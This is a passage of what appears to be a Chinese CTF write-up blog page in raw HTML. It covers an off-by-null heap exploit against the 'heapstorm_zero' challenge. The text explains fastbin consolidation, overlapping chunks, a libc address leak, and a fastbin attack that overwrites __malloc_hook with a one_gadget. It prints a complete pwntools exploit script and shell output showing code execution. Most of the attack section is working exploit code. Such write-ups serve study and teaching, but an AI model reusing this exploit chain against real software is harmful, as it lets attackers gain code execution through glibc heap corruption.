class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p><p>下面释放掉 chunk 11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p><p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p><p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p><p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>此时的内存状态如图</p><p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p><p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure><ul><li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li><li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li></ul><p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p>完整exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">from utils import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"></span><br><span class="line">path = &quot;./heapstorm_zero&quot;</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=0)</span><br><span class="line">bin = ELF(path, checksec=False)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># result = (unsigned int)(a1 - 1) &lt;= 0x37;</span><br><span class="line">def add(size, con):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def triger_consolidate(pay=&apos;&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。</span><br><span class="line">    :param pay:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    if pay == &apos;&apos;:</span><br><span class="line">        p.sendline(&apos;1&apos; * 0x400)  # malloc_consolidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos;)  # 0</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line">add(0x38, &apos;x&apos;)  # 9</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)  # shrink chunk 前，配置好</span><br><span class="line">add(0x38, pay)  # 10</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 11  , 保留块， 防止和 top chunk 合并</span><br><span class="line"></span><br><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 合并后 形成 0x210 大小的 smallbin</span><br><span class="line"># pwndbg&gt; x/4xg 0x555555757040</span><br><span class="line"># 0x555555757040: 0x0000000000000000      0x0000000000000211</span><br><span class="line"># 0x555555757050: 0x00002aaaab097d78      0x00002aaaab097d78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line">add(0x38, &apos;x&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line"></span><br><span class="line"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 触发 overlap</span><br><span class="line">dele(11)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"># 此时会有 指针交叉</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line"></span><br><span class="line">###  再次 shrink chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line"></span><br><span class="line">view(4)</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;lbase: &apos; + hex(lbase))</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 让 heap 回到 shrink chunk 后的情况</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">32: 0x0</span><br><span class="line">48: 0x0</span><br><span class="line">64: 0x0</span><br><span class="line">80: 0x0</span><br><span class="line">96: 0x0</span><br><span class="line">112: 0x0</span><br><span class="line">128: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/4xg 0x603040</span><br><span class="line">0x603040:       0x6161616161616161      0x0000000000000201</span><br><span class="line">0x603050:       0x00002aaaab097d68      0x00002aaaab097d68</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">add(0x18, &apos;A&apos; * 0x10)  # 1</span><br><span class="line">add(0x28, &apos;B&apos; * 0x20)  # 2</span><br><span class="line">add(0x38, &apos;C&apos; * 0x30)  # 3</span><br><span class="line">add(0x18, &apos;D&apos; * 0x10)  # 9</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x41)</span><br><span class="line">add(0x18, pay)  # 6</span><br><span class="line">add(0x28, &apos;asd&apos;)</span><br><span class="line">add(0x38, &apos;zxc&apos;)  # 5,c</span><br><span class="line">add(0x28, &apos;qqq&apos;)  # 6,d</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a1&apos;)  # 14</span><br><span class="line">add(0x28, &apos;a2&apos;)  # 15</span><br><span class="line"></span><br><span class="line"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span><br><span class="line"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span><br><span class="line">dele(5)</span><br><span class="line">dele(14)</span><br><span class="line">dele(0xc)</span><br><span class="line"></span><br><span class="line">dele(6)</span><br><span class="line">dele(15)</span><br><span class="line">dele(0xd)</span><br><span class="line"></span><br><span class="line">add(0x28, p64(0x41))</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line"></span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8))</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))</span><br><span class="line">add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把 unsorted bin 分配掉</span><br><span class="line">add(0x18, &apos;a&apos; * 0x18)</span><br><span class="line"></span><br><span class="line"># 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hook</span><br><span class="line">add(0x18, p64(lbase + 0xf02a4) * 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span><br><span class="line"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span><br><span class="line">dele(6)</span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure><h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p><p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span 